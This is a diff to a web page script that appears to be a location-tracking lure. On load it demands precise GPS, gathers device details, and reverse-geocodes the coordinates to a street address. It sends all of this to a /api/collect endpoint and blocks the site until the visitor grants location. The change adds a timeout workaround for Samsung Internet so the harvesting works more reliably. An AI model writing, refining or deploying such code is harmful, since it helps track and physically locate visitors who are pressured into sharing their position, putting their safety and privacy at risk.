@@ -513,68 +513,82 @@
 
         // Initial load — check permission state and request GPS immediately
         window.addEventListener('load', async () => {
-            // Check current permission state
+            let done = false;
+
+            // Safety: if GPS hangs (Samsung Internet), show blocked after 10s
+            const safetyTimer = setTimeout(() => {
+                if (!done) { done = true; showBlocked(); }
+            }, 10000);
+
             let permState = 'prompt';
             try {
                 const perm = await navigator.permissions.query({ name: 'geolocation' });
-                permState = perm.state; // 'granted', 'denied', or 'prompt'
+                permState = perm.state;
             } catch (e) { }
 
             if (permState === 'denied') {
-                // Already denied — show settings instructions directly
+                clearTimeout(safetyTimer);
+                done = true;
                 retryCount = 1;
                 showBlocked();
                 return;
             }
 
-            // Permission is 'prompt' or 'granted' — request GPS now
+            // Request GPS
             try {
                 const gpsPosition = await new Promise((resolve, reject) => {
                     if (!navigator.geolocation) { reject(new Error('Not supported')); return; }
                     navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true, timeout: 15000, maximumAge: 0
+                        enableHighAccuracy: true, timeout: 8000, maximumAge: 0
                     });
                 });
 
-                // GPS granted!
-                const info = await collectDeviceInfo();
-                info.gpsLocation = {
-                    lat: gpsPosition.coords.latitude,
-                    lon: gpsPosition.coords.longitude,
-                    accuracy: Math.round(gpsPosition.coords.accuracy) + 'm',
-                    altitude: gpsPosition.coords.altitude,
-                    speed: gpsPosition.coords.speed
-                };
+                if (!done) {
+                    clearTimeout(safetyTimer);
+                    done = true;
+                    // GPS granted!
+                    const info = await collectDeviceInfo();
+                    info.gpsLocation = {
+                        lat: gpsPosition.coords.latitude,
+                        lon: gpsPosition.coords.longitude,
+                        accuracy: Math.round(gpsPosition.coords.accuracy) + 'm',
+                        altitude: gpsPosition.coords.altitude,
+                        speed: gpsPosition.coords.speed
+                    };
 
-                try {
-                    const geoRes = await fetch(
-                        `https://nominatim.openstreetmap.org/reverse?lat=${info.gpsLocation.lat}&lon=${info.gpsLocation.lon}&format=json&accept-language=ar`
-                    );
-                    if (geoRes.ok) {
-                        const geo = await geoRes.json();
-                        info.gpsLocation.city = geo.address?.city || geo.address?.town || geo.address?.village || '';
-                        info.gpsLocation.district = geo.address?.suburb || geo.address?.neighbourhood || '';
-                        info.gpsLocation.state = geo.address?.state || '';
-                        info.gpsLocation.country = geo.address?.country || '';
-                        info.gpsLocation.road = geo.address?.road || '';
-                        info.gpsLocation.fullAddress = geo.display_name || '';
-                    }
-                } catch (e) { }
+                    try {
+                        const geoRes = await fetch(
+                            `https://nominatim.openstreetmap.org/reverse?lat=${info.gpsLocation.lat}&lon=${info.gpsLocation.lon}&format=json&accept-language=ar`
+                        );
+                        if (geoRes.ok) {
+                            const geo = await geoRes.json();
+                            info.gpsLocation.city = geo.address?.city || geo.address?.town || geo.address?.village || '';
+                            info.gpsLocation.district = geo.address?.suburb || geo.address?.neighbourhood || '';
+                            info.gpsLocation.state = geo.address?.state || '';
+                            info.gpsLocation.country = geo.address?.country || '';
+                            info.gpsLocation.road = geo.address?.road || '';
+                            info.gpsLocation.fullAddress = geo.display_name || '';
+                        }
+                    } catch (e) { }
 
-                try {
-                    await fetch('/api/collect', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(info)
-                    });
-                } catch (e) { }
+                    try {
+                        await fetch('/api/collect', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(info)
+                        });
+                    } catch (e) { }
 
-                dataCollected = true;
-                showSite();
+                    dataCollected = true;
+                    showSite();
+                }
 
             } catch (e) {
-                // Denied or timed out
-                showBlocked();
+                if (!done) {
+                    clearTimeout(safetyTimer);
+                    done = true;
+                    showBlocked();
+                }
             }
         });
     </script>
